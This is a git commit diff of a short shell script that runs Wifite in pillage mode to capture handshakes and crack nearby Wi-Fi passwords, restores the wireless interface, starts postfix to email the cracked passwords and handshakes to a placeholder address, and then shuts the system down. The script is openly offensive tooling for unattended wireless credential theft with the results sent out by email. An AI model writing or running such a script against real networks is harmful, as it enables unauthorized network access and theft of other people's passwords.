47dcc75c4ef7bc9f7632453ab9c3283bdb97af2d
Hariss Ali Gills <harissgills@gmail.com>
2022-01-29 03:21:30 +0000

    script.sh complete

--- script.sh
+++ script.sh
@@ -1,7 +1,13 @@
 #!/usr/bin/sh
+
+# Runs Wifite in Pillage mode for 60s and kills external proccesses
 sleep 30s
 wifite -p 60 --kill
 wifite --cracked
+# Return interface to managed mode
+airmon-ng stop wlan0mon
+systemctl start NetworkManager
+# Send an email of cracked passwords and handshakes to username@email.com  
 systemctl start postfix
 sleep 30S
 my_address = username@email.com
@@ -14,4 +20,5 @@ else
 fi
 sleep 30s
 systemctl stop postfix
+# Shutdown the system
 shutdown now
